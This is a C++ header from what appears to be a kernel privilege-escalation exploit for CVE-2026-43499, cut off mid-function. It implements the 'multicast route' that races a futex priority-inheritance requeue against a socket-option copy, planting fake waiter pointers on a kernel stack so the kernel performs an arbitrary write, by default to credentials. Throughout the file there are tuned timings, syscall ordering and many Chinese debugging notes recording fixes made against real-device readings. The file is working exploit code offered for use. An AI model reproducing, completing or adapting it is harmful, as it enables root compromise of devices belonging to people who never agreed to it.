#pragma once
/** @file backend/cve_2026_43499/landing/multicast_route.hpp
 *  The multicast route's body: the three actors, in the order the retired route ran them.
 *
 *  What this replaces and why the shape is what it is. The route needs three threads: a waiter that
 *  parks on the chain word asking the kernel to move it onto the target, an owner that holds the
 *  target and then the chain -- which is what makes the parked waiter a link in a priority-inheritance
 *  chain -- and a consumer that changes the waiter's scheduling attributes, which is what makes the
 *  kernel walk that chain. The walk is the write. The trigger itself runs on the waiter's own thread,
 *  after its park call returns, because the stale rt_mutex_waiter the trigger overwrites sits on that
 *  thread's kernel stack: a copy issued from any other thread lands somewhere else.
 *
 *  Three details are kept because the retired route needed them, and each is a place a cleaner-looking
 *  version would silently stop working:
 *   - the opening rounds copy the stamp without arming the consumer, and the kernel's own shape check
 *     refuses the copy on most of them, so the rounds before arming are the ones that overwrite each
 *     other;
 *   - a round only counts when the consumer reports a successful call: the socket option's return
 *     code says the copy landed, not that anything was written;
 *   - after the trigger, the waiter issues one more lock with an already-expired deadline, which is
 *     the slow-path removal of the dangling blocked-on pointer the requeue can leave behind; skipping
 *     it leaves the next attempt walking a waiter that is no longer there.
 *
 *  Every number is data: the stamp geometry and the attempt budget come from the profile, the
 *  timings and the consumer's policy come from the caller, and a zero where a value is required is a
 *  named refusal before any thread starts. The platform calls sit behind a policy type, so the whole
 *  order above can be driven and its log asserted on the host.
 */
#include <atomic>

#include "support/gl_log.h"   /* ★ 第 271 轮 ✓（用户裁定）：异步日志接缝 ✓ —— 出 PI 由它打印 ✓ */
#include <concepts>
#include <cstddef>
#include <cstdint>
#include <string_view>
#include <cstdio>
#include <cerrno>
#include <cstring>
#if defined(__ANDROID__)
#include <unistd.h>   /* getpid ✓（ghost disarm 的伪地址，第 79 轮 ✓） */
#include <linux/futex.h>   /* FUTEX_LOCK_PI ✓（host 无此头 ✗ ⇒ 需守卫 ✓，第 85 轮修 ✓） */
#endif
#include <csignal>
#include <pthread.h>
#if defined(__ANDROID__)
#include <linux/futex.h>
#endif

#include "backend/cve_2026_43499/memory/multicast_arm.hpp"
#include "backend/cve_2026_43499/route/multicast_policy.hpp"
#include "backend/cve_2026_43499/route/route_status.hpp"
#include "backend/cve_2026_43499/landing/multicast_window.hpp"

namespace ghostlock::backend::cve_2026_43499::landing {
    /** The platform calls one attempt makes, as a compile-time policy: the four priority-inheritance
     *  operations, the timed variants the park and the post-trigger removal need, the scheduling call
     *  the consumer makes, the loop primitives, and the datagram socket the stamp travels on. A policy
     *  that leaves one out does not compile, which is the point of writing the edge down. */
    template <class Ops>
    concept RouteOps = requires(std::uint32_t *word, std::uint32_t *other, std::int32_t tid,
                                std::int32_t nice, std::uint32_t policy, std::int64_t micros,
                                int fd, const std::uint8_t *buffer, std::size_t size) {
        { Ops::lock_pi(word) } -> std::same_as<int>;
        { Ops::lock_pi_until(word, micros) } -> std::same_as<int>;
        { Ops::wait_requeue_pi_until(word, other, micros) } -> std::same_as<int>;
        { Ops::cmp_requeue_pi(word, other) } -> std::same_as<int>;
        { Ops::unlock_pi(word) } -> std::same_as<int>;
        { Ops::setattr(tid, nice, policy) } -> std::same_as<int>;
        /* CPU pin 不进 concept：演员入口自己 pin（这样不牵动 7 个实现体）。 */
        { Ops::yield() } -> std::same_as<void>;
        { Ops::sleep_micros(micros) } -> std::same_as<void>;
        { Ops::thread_id() } -> std::same_as<std::int32_t>;
        { Ops::open_datagram() } -> std::same_as<int>;
        { Ops::set_block_source(fd, buffer, size) } -> std::same_as<int>;
        { Ops::close_fd(fd) } -> std::same_as<void>;
        /** The errno the last call left, read straight after it by the shape rule. */
        { Ops::last_errno() } -> std::same_as<std::int32_t>;
        /** The errno that still means the copy landed: the address a multicast group source would
         *  need is not there, which the kernel decides after it copied the structure. */
        { Ops::addr_not_available() } -> std::same_as<std::int32_t>;
    };

    /** How big the stamp may be. The retired buffer was 0x80 bytes; this is the ceiling a config is
     *  checked against, so a profile that asks for more is refused rather than truncated. */
    inline constexpr std::size_t kMaxStampBytes = 512U;

    /** Everything one attempt is configured with. Every member is either a profile value or a caller
     *  value; none is a default this file invented. */
    struct MulticastRouteConfig final {
        /** Where the two pointers sit in the stamp, and how long the stamp is. */
        memory::MulticastGeometry stamp{};
        /** The attempt budget, the hold, and the number of opening rounds that do not arm. */
        route::MulticastLimits limits{};
        /** The target and value the payload page was built with. An attempt for a different pair is
         *  refused, because the tuple that decides what gets written is in the page, not in this
         *  call. */
        std::uint64_t target = 0U;
        std::uint64_t value = 0U;
        /** How long the waiter parks before the kernel gives up on it. */
        std::int32_t park_ms = 0;
        /** How long the chain is given to settle between the waiter parking and the requeue. */
        std::int32_t settle_us = 0;
        /** 退役的相位（`waiter.post_requeue_settle_us`）：requeue 之后、consumer 动作之前等这么久
         *  —— 内核把链搬完需要时间，早动就白走。值走 wire，为零表示调用方明确说"不等"。 */
        std::int32_t post_requeue_settle_us = 0;
        /** 退役的相位（`waiter.post_adjust_settle_us`）：一次 setattr 之后等这么久再进下一次。 */
        std::int32_t post_adjust_settle_us = 0;
        /** How long the consumer waits before its first call in a round. The retired field exists
         *  for the routes that need the trigger to finish first; the multicast trigger leaves it
         *  zero, and zero here means the caller said so. */
        std::int32_t consumer_delay_us = 0;
        /** The consumer's calls per armed round, and the cap that ends a round. */
        std::int32_t burst_calls = 0;
        std::int32_t max_calls = 0;
        /** The fallback's deadline: a lock the consumer tries when the scheduling call is refused. */
        std::int32_t fallback_lock_us = 0;
        /** 退役门禁要求固定 CPU 对：等待者/持有者与消费者各在一个 CPU 上
         *  （走 wire 的 execution.recommended_cpus，非默认值）。 */
        /* ★ ghost disarm（第 79 轮 ✓）：退役由 `route_needs_ghost_disarm(profile)` 判定 ✓，
         *  即"是否为 multicast 策略" ✓ ⇒ 本结构只服务 multicast 路由 ✓ ⇒ 默认开 ✓。 */
        bool needs_ghost_disarm = true;
        std::int32_t main_cpu = -1;
        std::int32_t consumer_cpu = -1;
        /** The nice rotation: the retired consumer walks this modulus so one of the values lands. */
        std::int32_t nice_modulus = 0;
        /** The scheduling policy the consumer's calls set. */
        std::uint32_t policy = 0U;
        /** Where the fabricated task and lock are, from the prepared region. */
        std::uint64_t fake_task = 0U;
        std::uint64_t fake_lock = 0U;
    };

    /** What one attempt did, in the route's own vocabulary. */
    struct MulticastRouteReport final {
        route::RouteStatus status{};
        std::int32_t attempts = 0;
        std::int32_t calls = 0;
        std::int32_t successes = 0;
        std::int32_t stamp_result = 0;
        std::int32_t stamp_errno = 0;
        std::int32_t requeue_result = 0;
        std::int32_t waiter_result = 0;
        std::int32_t owner_result = 0;
        /** The write shape carried into this attempt; diagnostic, not a decision input here. */
        std::int32_t write_mode = 0;
        bool preserve_child = false;
    };

    /** What the three actors share. Reset per attempt; the plain members are written before the
     *  atomic release on route_done and read after the acquire, which is the ordering they need. */
    struct MulticastRouteShared final {
        alignas(64) std::uint32_t wait_word = 0U;
        alignas(64) std::uint32_t target_word = 0U;
        alignas(64) std::uint32_t chain_word = 0U;
        std::atomic<std::int32_t> waiter_ready{0};
        std::atomic<std::int32_t> waiter_waiting{0};
        std::atomic<std::int32_t> owner_started{0};
        std::atomic<std::int32_t> owner_chain_done{0};
        std::atomic<std::int32_t> owner_stop{0};
        std::atomic<std::int32_t> route_done{0};
        std::atomic<std::int32_t> waiter_tid{0};
        std::atomic<std::int32_t> consumer_go{0};
        std::atomic<std::int32_t> consumer_stop{0};
        std::atomic<std::int32_t> consumer_calls{0};
        std::atomic<std::int32_t> consumer_success{0};
        std::atomic<std::int32_t> consumer_inflight{0};
        std::atomic<std::int32_t> route_delay_usec{0};
        std::int32_t waiter_result = 0;
        std::int32_t owner_result = 0;
        std::int32_t requeue_result = 0;
        /* PI 内的 syscall 读数（2026-10-12 用户裁定：PI 内只落字段，出 PI 才打印）。
         * errno 必须**紧接其 syscall 之后**取，否则会被下一条调用覆盖。 */
        std::int32_t lock_result = 0;
        std::int32_t lock_errno = 0;
        std::int32_t park_errno = 0;
        std::int32_t disarm_result = 0;
        std::int32_t disarm_errno = 0;
        /* park-about 是**park 那一刻**的快照，所以这里存一份：这两个 futex 字是**活的**（owner
         *  取锁后 target_word 会被内核/演员改写，解锁后又回 0）⇒ 出 PI 再读读到的是**别的时候**的值，
         *  不是被诊断的那一刻。撤环前的 POD 环天然满足（记录写在 park 点之后）；撤环改成出 PI 统一
         *  打印后，首轮实现漏了快照 ⇒ 真机该列整列变 0（基线为 0x1768… 递增）✗ ⇒ 快照字段是这条
         *  读数**语义的前提**，不是多余状态（Lead 2026-10-12 追认为第 6、7 个字段）。 */
        std::uint32_t park_wait_word = 0U;
        std::uint32_t park_target_word = 0U;
        std::int32_t stamp_result = -1;
        std::int32_t stamp_errno = 0;
        std::int32_t attempts_used = 0;
        std::int32_t status_code = static_cast<std::int32_t>(route::RouteResultCode::Retryable);
        std::int32_t status_step = 0;

        void reset() noexcept {
            waiter_ready.store(0);
            waiter_waiting.store(0);
            owner_started.store(0);
            owner_chain_done.store(0);
            owner_stop.store(0);
            route_done.store(0);
            waiter_tid.store(0);
            consumer_go.store(0);
            consumer_stop.store(0);
            consumer_calls.store(0);
            consumer_success.store(0);
            consumer_inflight.store(0);
            route_delay_usec.store(0);
            waiter_result = 0;
            owner_result = 0;
            requeue_result = 0;
            lock_result = 0;
            lock_errno = 0;
            park_errno = 0;
            disarm_result = 0;
            disarm_errno = 0;
            park_wait_word = 0U;
            park_target_word = 0U;
            stamp_result = -1;
            stamp_errno = 0;
            attempts_used = 0;
            status_code = static_cast<std::int32_t>(route::RouteResultCode::Retryable);
            status_step = 0;
        }
    };

    /**
     *  One multicast attempt, in full. The window's protocol is prepare, execute, disarm, destroy;
     *  this class is the execution, so execute() starts the three actors, performs the requeue from
     *  the calling thread, joins them, and reports what the consumer saw.
     *
     *  @tparam Ops The platform policy above. Nothing here calls the kernel directly, which is what
     *              makes the order testable.
     *  @note   One attempt per call: the caller's retry policy is the window's, and a second attempt
     *          re-parks a fresh waiter, because a requeue consumes the waiter it moved.
     */
    // TODO(routeexec-compile-time): 机械改动 —— 本类此前继承 `landing::RouteExec`（虚基类）并 override
    //   其 `execute`/`arm`；按用户裁定与 docs/analysis/43499-plan-routeexec-compile-time.md，
    //   路由不再继承任何东西：窗口以本类型作模板实参直接调用（编译期）。
    //   完成 = 三线门禁绿 ＋ 真机判据不变 ＋ Lead/用户确认 ⇒ 删本标注。
    template <RouteOps Ops>
    class MulticastRoute final {
      public:
        explicit MulticastRoute(const MulticastRouteConfig &config) noexcept : config_(config) {}

        MulticastRoute(const MulticastRoute &) = delete;
        MulticastRoute &operator=(const MulticastRoute &) = delete;
        ~MulticastRoute() noexcept { stop_threads(); }

        /** The window's warm-up beat. The route's own loop is what arms the consumer per round --
         *  the retired route does it inside the trigger -- so this is the window's account of a round
         *  that copied the stamp without arming, and it reports whether that round is one the limits
         *  allow. */
        [[nodiscard]] bool arm(std::int32_t attempt) noexcept {
            return attempt >= 0 && attempt < config_.limits.arm_sequence;
        }

        /** One attempt. The stamp is built here, the three actors run, the requeue happens, and the
         *  waiters are joined before this returns. */
        [[nodiscard]] bool execute(std::uint64_t address, std::uint64_t value,
                                   std::uint64_t offset) noexcept {
            memory::WriteRequest request{};
            request.target = address;
            request.mode = memory::WriteMode::Credential;
            request.preserve_child = false;
            return execute(request, value, offset);
        }

        /** One attempt carrying the write shape; the target is the request's target. */
        [[nodiscard]] bool execute(const memory::WriteRequest &request, std::uint64_t value,
                                   std::uint64_t offset) noexcept {
            static_cast<void>(offset);
            report_ = MulticastRouteReport{};
            report_.write_mode = static_cast<std::int32_t>(request.mode);
            report_.preserve_child = request.preserve_child;
            if (config_.limits.max_attempts <= 0 || config_.limits.arm_hold <= 0 ||
                config_.limits.arm_sequence <= 0 || config_.stamp.buffer_size == 0U ||
                config_.stamp.buffer_size > sizeof(stamp_) || config_.nice_modulus <= 0 ||
                config_.max_calls <= 0 || config_.burst_calls <= 0 || config_.park_ms <= 0) {
            report_.status = refusal(route::RouteResultCode::Unsupported, 58);
                return false;
            }
            /* The page already holds the tuple, so this call has to be the one the page was built
             *  for: a different target or value would write the page's pair while reporting this
             *  one. */
            /* 诊断（round 232 ✓）：打印 guard 的两半，定位是哪一项不等 ✓（验证后同批清理 ✓）。 */
            std::printf("main: route-guard address=0x%llx target=0x%llx value=0x%llx cfg=0x%llx",
                        static_cast<unsigned long long>(request.target),
                        static_cast<unsigned long long>(config_.target),
                        static_cast<unsigned long long>(value),
                        static_cast<unsigned long long>(config_.value));
            if (request.target != config_.target || value != config_.value) {
            report_.status = refusal(route::RouteResultCode::Unsupported, 59);
                return false;
            }
            if (!build_stamp()) {
            report_.status = refusal(route::RouteResultCode::FallbackSafe, 60);
                return false;
            }
            shared_.reset();
            shared_.route_delay_usec.store(config_.consumer_delay_us);
            if (!start_threads()) {
                stop_threads();
            report_.status = refusal(route::RouteResultCode::FallbackSafe, 61);
                return false;
            }
            requeue();   /* ★ 回退（第 148 轮 ✓）：移入 waiter ⇒ `w2` 不完成 ✗ ⇒ 复原 ✓（结构性不兼容 ✓）。 */
            /* 触发**回到等待者线程**：退役原文说拷贝落在"**调用者的栈**"上（a race against skb page
             *  recycling ✓）⇒ 触发它的线程必须正是"park 刚返回"的那个 ✓。 */
            while (shared_.route_done.load() == 0) {
                Ops::yield();
            }
            stop_threads();
            /* ★ 出 PI 的唯一 flush 点（2026-10-12 用户裁定：禁令作用域＝PI 内；PI 完成后才打印）：
             *  所有 actor 已 join ⇒ 链不再被走 ⇒ 这里打印的读数由 PI 内的字段带出（零 IO 进 PI）
             *  ⇒ 行名与取值与撤掉的 POD 环**逐字一致** ⇒ 判据仍看真机日志含这些行 ✓。 */
            report_pi_readings("info");
            return judge();
        }

        [[nodiscard]] const MulticastRouteReport &report() const noexcept { return report_; }

      private:
        [[nodiscard]] route::RouteStatus refusal(route::RouteResultCode code,
                                                 std::int32_t step) const noexcept {
            route::RouteStatus status{};
            status.code = code;
            status.step = step;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            return status;
        }

        /** The stamp: zeros, the structure's family word, and the two pointers the stale waiter is
         *  read through. All or nothing, so a geometry that does not fit refuses before the socket
         *  exists. */
        [[nodiscard]] bool build_stamp() noexcept {
            std::memset(stamp_, 0, sizeof(stamp_));
            /* The socket option's structure starts with a family word; leaving it zero makes the
             *  kernel refuse the copy before it lands, which is not the point of the round. This is
             *  the option's layout, not a setting. */
            if (config_.stamp.buffer_size >= 10U) {
                const std::uint16_t family = 0U;
                std::memcpy(stamp_ + 8U, &family, sizeof(family));
            }
            if (memory::encode_multicast_arm(stamp_, config_.stamp.buffer_size, config_.stamp,
                                             config_.fake_task, config_.fake_lock,
                                             sizeof(std::uintptr_t)) != memory::ArmVerdict::Ok) {
                return false;
            }
            /* ★ 元组（round 154 补 ✓）：退役 `encode_compact_waiter` 的 `preserve_child` 支把它写进
             *  **stamp** ✓ —— 而 stamp 正是内核拷贝到栈上的那个缓冲 ✓ ⇒ 缺了它，内核搬过去的就是
             *  "没有元组的等待者" ✗（拷贝落地 ✓、调用成功 ✓、就是什么都不写 ✗）。
             *  偏移 0x18/0x20/0x28 是内核 `rt_mutex_waiter` 自身的 pi_tree/node/prio 位置 ✓
             *  （退役 payload_builder.cpp:34-45 ✓，非本树数据 ✓）。 */
            const auto put_tuple = [&](std::size_t off, std::uint64_t value) noexcept {
                if (config_.stamp.waiter_offset + off + sizeof(std::uint64_t) <=
                    config_.stamp.buffer_size) {
                    std::memcpy(stamp_ + config_.stamp.waiter_offset + off, &value, sizeof(value));
                }
            };
            /* `value != 0` ⟺ preserve_child（本树 write_layout 的规则 ✓：preserve ⇒ value != 0 ✓）。 */
            /* ★★ 第 196 轮 ✓（权威 `origin/main` 固定向量，逐字 ✓）：
             *  `{mode=Zero, leaf=1}` ⇒ **`pc = target − 8`** ✓、**`left = 0`** ✓；
             *  而 `right = preserve ? (Credential ? init_cred_alias : page_base+0x100) : 0` ✓（`payload_write_layout` ✓）。
             *  ⇒ ⇒ 原先写 `{pc = value, right = 0, left = target}` ✗ ⇒ **三字全错** ⇒ 改成权威值 ✓。 */
            /* Stamp carries only task/lock (reference shape); the write vector belongs to the page. */
            return true;
        }

        [[nodiscard]] bool start_threads() noexcept {
            const int rc_consumer =
                    ::pthread_create(&consumer_, nullptr, &MulticastRoute::consumer_entry, this);
            if (rc_consumer != 0) {
                return false;
            }
            consumer_started_ = true;
            const int rc_owner = ::pthread_create(&owner_, nullptr, &MulticastRoute::owner_entry, this);
            if (rc_owner != 0) {
                return false;
            }
            owner_started_ = true;
            /* 移植缺的一行：requeue() 等的是 shared_.owner_started，而它此前从未被置 1
             * （只有 reset 与 read）⇒ requeue 死等、一次都不调用 ⇒ 写不可能发生。 */
            /* 旧码（原文保留 ✓，第 261 轮移入 owner 线程且置于 `lock_pi(target_word)` 之后 ✗）：
             *     shared_.owner_started.store(1);    // ⇒ 门控在 owner 尚未持有 target 时即放行 ✗（ref 相反 ✓） */
            const int rc_waiter = ::pthread_create(&waiter_, nullptr, &MulticastRoute::waiter_entry, this);
            if (rc_waiter != 0) {
                return false;
            }
            waiter_started_ = true;
            return true;
        }

        /** The calling thread's half: wait for the chain to be in place, requeue, and let the
         *  waiter's own thread do the write. */
        /** ★ 第 190 轮 ✓（旧码 `mr_intr` 同形 ✓）：`SIGUSR1` 的**空处理体** ——
         *  旧码先 `sigaction(SIGUSR1, mr_intr, NULL)` ✓ 再发信号 ✓ ⇒ 缺它必然**终止进程** ✗。 */
        static void on_signal(int) noexcept {}

        void requeue() noexcept {
            debug("requeue ->");   /* ★ 步骤前 ✓ 语句边界 ✓ */
            std::signal(SIGUSR1, &MulticastRoute::on_signal);   /* 幂等 ✓；必须先于任何 tgkill ✓ */
            /* ★★ 第 258 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:176` 逐字 ——
             *  门控循环里是 **`usleep(race_state_poll_interval_us())`** ✓ 而本树用 `Ops::yield()` ✗ ⇒
             *  **⇒ 忙等 ⇒ 标志一置位就**立刻**发 requeue ⇒ 而 park 线程可能尚未被调度** ✗ ⇒
             *  ⇒ 真机读数**并存**即证：`requeue ret=0`（⇒ 无人可唤醒 ✓）但 `park errno=110`（⇒ 一直等不到 ✓）✓。
             *  值走 wire（`execution.*state_poll_interval_us` ✓）✗ 不写死 ✓；为零时退回 `yield` ✓。 */
            while (shared_.waiter_waiting.load() == 0 || shared_.owner_started.load() == 0) {
                /* ★★ 第 259 轮 ✓（ref `race/threads.cpp:176` 逐字：门控循环里**短睡**，而非忙等 ✗）：
                 *  本树原是 `Ops::yield()` ✗ ⇒ **标志一置位就**立刻**发 requeue ⇒ park 线程可能尚未上 CPU** ⇒
                 *  真机读数**并存即证**：`requeue ret=0`（⇒ 无人可唤醒 ✓）但 `park errno=110`（⇒ 等不到 ✓）✓✓
                 *  值复用**已有的 wire 字段** `settle_us` ✓（⇒ ref 用 `race_state_poll_interval_us` ✓ 同角色 ✓），
                 *  为零时退回 `yield` ✓（⇒ 不引入新的常量 ✗ 不写死 ✗）。 */
                if (config_.settle_us > 0) {
                    Ops::sleep_micros(config_.settle_us);
                } else {
                    Ops::yield();
                }
            }
            if (config_.settle_us > 0) {
                debug("requeue branch: settle grace before requeue");
                Ops::sleep_micros(config_.settle_us);
            }
            /* 与退役同字：requeue 从**等待者持有的那个字**（chain_word ✓）搬走（退役 cmp_requeue_pi(chain, target)）。 */
            /* ★ 第 174 轮 ✓：旧码（`641aaf6`）的成功判据是 **`r < 0 && errno == EDEADLK`** ✓
             *  ⇒ 故必须把 `errno` 读出来 ✓（本树此前**从不看它** ✗）。 */
            /* ★ 第 178 轮 ✓（旧码"控制值"同形 ✓）：requeue 前把该字**置 1** ✓ ——
             *  旧码是 `mr_cond = 1` 后立即 requeue ✓；本树此前该字是 waiter 的 TID ✗ ⇒ 内核判 EAGAIN/EINVAL ✗。 */
            /* ★★ 第 184 轮 ✓（旧码同形 ✓）：旧码在 requeue 前**等四标志齐 + `usleep(200000)`** ✓；
             *  本树只等两个标志 ✗ ⇒ 加同样的**宽限** ⇒ 让 waiter 真正进入 park 后再 requeue ✓。 */
            /* ★★ 第 200 轮 ✓：宽限**仅首轮**（旧码只在 `resident_start` 一次 ✓）—— 每轮都等 ⇒ 15 轮累积 ⇒
             *  与 LMK 击杀（`signal 9` ✓）吻合 ✗ ⇒ 改为按"首轮"执行 ✓。 */
            if (shared_.attempts_used <= 1) { Ops::sleep_micros(200000); }
            shared_.chain_word = 1U;
            /* ★ 第 179 轮 ✓（与旧码 `UNLOCK(l1)` 同效 ✓）：`val3` 对应的那个字也要"归零"✓ ⇒
             *  否则我们读到的值（owner 的 TID ✗）与内核所见不一致 ⇒ **EAGAIN** ✗。 */
            shared_.target_word = 0U;
            /* ★★ 第 267 轮 ✓（既有探针 `tools/requeue_probe.cpp` 的**内核级判据** ✓，其头注释逐字：
             *  「The wait for the parked state is **not a sleep**：a priority-inheritance futex **records its
             *    owner in the word and sets a bit when a waiter is queued** ⇒ the owner **waits for that bit**；
             *    **if it never appears the probe fails rather than requeueing nothing and calling it success**」✓）
             *  ⇒ ⇒ **等"等待者已入队"的位（`0x80000000` ✓）再 requeue** ✗ —— 本树原靠 `waiter_waiting` ＋ 宽限 ✗
             *  ⇒ 两者都**不代表内核已入队** ⇒ **⇒ 这是"`requeue ret=0` 却唤醒 0 个"的机制级成因** ✓✓。 */
            constexpr std::uint32_t kWaitersBit = 0x80000000U;
            for (std::int32_t spin = 0; spin < config_.limits.arm_hold; ++spin) {
                if ((shared_.wait_word & kWaitersBit) != 0U) { break; }
                Ops::yield();
            }
            std::printf("main: waiters-bit word=0x%x queued=%d",
                        static_cast<unsigned>(shared_.wait_word),
                        (shared_.wait_word & kWaitersBit) != 0U ? 1 : 0);
            errno = 0;
            /* ★★ 第 250 轮 ✓：`uaddr` 随 park 同改 `wait_word` ✓（旧码（原文保留 ✓）：`cmp_requeue_pi(&shared_.chain_word, …)` ✗）
             *  ⇒ 三者一致：**锁的字 ＝ park 的字 ＝ requeue 的 uaddr** ✓ ＝ 旧码 `l2` 的角色 ✓。 */
            /* ★★ 第 252 轮 ✓：`uaddr = chain_word`（等待者**停驻**的字 ✓，owner 亦持它 ✓）、
             *  `uaddr2 = wait_word`（等待者**持有**的字 ✓ —— `:514` lock_pi ✓）⇒ 两者不同 ✓。 */
            /* ★★ 第 254 轮 ✓（ref 分工）：`uaddr` = **停驻字**（`wait_word` ✓）、`uaddr2` = **持有字**（`chain_word` ✓）
             *  —— 第 252 轮写反 ✗ ⇒ 真机 `EAGAIN(11)` ✓（自洽 ✓）。 */
            /* ★★ 第 265 轮 ✓（决定性 ✓）：`uaddr2` **必须与等待者 park 时的 `uaddr2` 相同** ✗ ——
             *  park（`:575` ✓）传的是 `&shared_.**target_word**` ✓，而此处曾传 `&shared_.chain_word` ✗
             *  ⇒ ⇒ 内核按**另一把锁**去找对应的 PI waiter ⇒ **找不到** ⇒ *仍返回 0* 但**唤醒 0 个** ✗
             *  ⇒ ⇒ ⇒ 三读数**完全吻合**：`requeue ret=0` ✓ ＋ `park ret=66/errno=110`（⇒ 一直等不到 ✓）
             *     ＋ `park about-to value=0x0`（⇒ 条件满足 ⇒ 确实挂起 ✓）。 */
            shared_.requeue_result = Ops::cmp_requeue_pi(&shared_.wait_word, &shared_.target_word);
            /* ★★ 第 197 轮**回退** ✗：第 190 轮在此发 `SIGUSR1` ⇒ 真机在"建线程/设 CPU"后**停住** ✗
             *  （⇒ 纯 C 的 `tgkill` 是**同进程内**的 `mr_y_tid` ✓；本树条件不同 ⇒ 先撤 ✓）。 */
            debug("requeue <- ret %lld", static_cast<long long>(shared_.requeue_result));
            std::printf("main: requeue ret=%d errno=%d (EDEADLK=35 ✅ 旧码的成功形态 ✓)",
                        static_cast<int>(shared_.requeue_result), static_cast<int>(errno));
            /* 相位一（退役 waiter.post_requeue_settle_us）：内核搬完链再让 consumer 动。 */
            if (config_.post_requeue_settle_us > 0) {
                Ops::sleep_micros(config_.post_requeue_settle_us);
            }
        }

        void stop_threads() noexcept {
            shared_.consumer_go.store(0);
            shared_.consumer_stop.store(1);
            shared_.owner_stop.store(1);
            if (waiter_started_) {
                (void) ::pthread_join(waiter_, nullptr);
                waiter_started_ = false;
            }
            if (owner_started_) {
                (void) ::pthread_join(owner_, nullptr);
                owner_started_ = false;
            }
            if (consumer_started_) {
                (void) ::pthread_join(consumer_, nullptr);
                consumer_started_ = false;
            }
        }

        /** The PI readings, one line each, written out only after every actor has stopped.
         *  撤掉 POD 环后由本函数承担它的展开：行名与取值与撤环前**逐字一致** ⇒ 真机判据不变。
         *  @param level The level name for every line (the logger's level comes from the profile).
         *  @note Must run outside PI: the caller reaches it after stop_threads() has joined all
         *        actors, so nothing is being walked while these lines are written. */
        void report_pi_readings(const char *level) noexcept {
            const gl_log_level at = gl_log_level_from_name(level);
            gl_log_write(at, __FILE__, __LINE__, "waiter-lock %d %d", (int) shared_.lock_result,
                         (int) shared_.lock_errno);
            gl_log_write(at, __FILE__, __LINE__, "park-about word %u",
                         (unsigned) shared_.park_wait_word);
            gl_log_write(at, __FILE__, __LINE__, "park-about target-word address 0x%x",
                         (unsigned) shared_.park_target_word);
            gl_log_write(at, __FILE__, __LINE__, "park-return %d %d", (int) shared_.waiter_result,
                         (int) shared_.park_errno);
#if defined(__ANDROID__)
            /* 摘除只在设备侧跑（与写入点同一条件 ⇒ 非设备构建不印这条幻影行）。 */
            if (config_.needs_ghost_disarm) {
                gl_log_write(at, __FILE__, __LINE__, "ghost-disarm %d %d",
                             (int) shared_.disarm_result, (int) shared_.disarm_errno);
            }
#endif
        }

        /* PI-EXEMPT-JUDGE：本函数在 PI 之外，故不在禁令作用域内 —— 它唯一的调用点在 stop_threads()
         *  之后（所有 actor 已 join ⇒ 链不再被走），因此这里可以直接打印；守卫台账里 judge 是**具名
         *  豁免**，本条注释即它的出处（见 tools/window_body_guard.py 的 PI-EXEMPT-JUDGE ✓）。 */
        /** The verdict, with the rule the retired route applies: the socket option's answer is not
         *  the answer -- only a consumer call the kernel accepted counts as a landed write, so a
         *  status of Ok without one is downgraded to a retry. */
        [[nodiscard]] bool judge() noexcept {
            report_.attempts = shared_.attempts_used;
            report_.calls = shared_.consumer_calls.load();
            report_.successes = shared_.consumer_success.load();
            report_.stamp_result = shared_.stamp_result;
            report_.stamp_errno = shared_.stamp_errno;
            report_.requeue_result = shared_.requeue_result;
            report_.waiter_result = shared_.waiter_result;
            report_.owner_result = shared_.owner_result;
            route::RouteStatus status{};
            status.code = static_cast<route::RouteResultCode>(shared_.status_code);
            status.step = shared_.status_step;
            status.error_number = shared_.stamp_errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            if (status.code == route::RouteResultCode::Ok &&
                (report_.calls == 0 || report_.successes == 0)) {
                status.code = route::RouteResultCode::Retryable;
                status.step = 62;
            }
            /* ★ C 段 ✓（两个**结果分支**各出一条 ✓）：judge 的**唯一调用点在 stop_threads() 之后**
             *  ⇒ 本函数整个在 PI 之外（2026-10-12 用户裁定）⇒ 直接打印，不进环、也不受守卫扫描 ✓
             *  （守卫台账里 judge 是**具名豁免** ✓，见 tools/window_body_guard.py）。 */
            debug("judge-outcome %lld %lld", static_cast<long long>(status.code),
                    static_cast<long long>(status.step));
            report_.status = status;
            return status.code == route::RouteResultCode::Ok;
        }

        /** The trigger, on the waiter's thread: copy the stamp onto this thread's kernel stack until
         *  one copy is one the kernel accepted, arm the consumer on the rounds that count, and only
         *  accept a round the consumer confirms. */
        void trigger() noexcept {
            /* PI-IN-TRIGGER：trigger **全体在 PI 内**（唯一调用点是 waiter_main 的 PI 段之内、park 之后
             *  —— 拷贝必须落在"park 刚返回"的那个线程栈上）⇒ 本函数没有 PI 之外的尾部。 */
            const int fd = Ops::open_datagram();
            if (fd < 0) {
                shared_.status_code = static_cast<std::int32_t>(route::RouteResultCode::FallbackSafe);
                shared_.status_step = 63;
                return;
            }
            std::int32_t result = -1;
            std::int32_t stamp_errno = 0;
            for (std::int32_t attempt = 1; attempt <= config_.limits.max_attempts; ++attempt) {
                /* ★ 每轮**重新下毒**（round 155 ✓）：退役注释原话 "Re-poison and re-walk instead,
                 *  arming from the point where the earlier copies have overwritten each other" ⇒
                 *  上一轮的拷贝已经把 stamp 啃过 ⇒ 不重建就等于后续轮次拿旧形状去赌 ✗。 */
                if (!build_stamp()) {
                    break;
                }
                shared_.attempts_used = attempt;
                result = Ops::set_block_source(fd, stamp_, config_.stamp.buffer_size);
                stamp_errno = Ops::last_errno();
                /* The opening rounds only copy; a copy the kernel refused for any reason other than
                 * the shape check is not a landed shape either, so both cases try again. */
                if (attempt < config_.limits.arm_sequence ||
                    !shape_landed(result, stamp_errno)) {
                    /* ★ 分支日志（2026-10-12 裁定：**分支也要** ✓）：warm-up 轮 / 形状未落 ⇒ 只发不 arm ✓。 */
                    continue;
                }
                shared_.consumer_go.store(attempt);
                for (std::int32_t spin = 0; spin < config_.limits.arm_hold; ++spin) {
                    Ops::yield();
                }
                shared_.consumer_go.store(0);
                while (shared_.consumer_inflight.load() != 0) {
                    Ops::yield();
                }
                if (shared_.consumer_success.load() > 0) {
                    break;
                }
            }
            shared_.stamp_result = result;
            shared_.stamp_errno = stamp_errno;
            /* The removal the requeue can leave behind: one more lock on a word of this process with a
             * deadline that has already passed, which walks the slow path and drops the dangling
             * blocked-on pointer while this frame is still on the stack. */
            std::uint32_t dummy = 0x80000000U | static_cast<std::uint32_t>(shared_.waiter_tid.load());
            (void) Ops::lock_pi_until(&dummy, 0);
            Ops::close_fd(fd);
            const bool landed = shared_.consumer_success.load() > 0;
            shared_.status_code = static_cast<std::int32_t>(
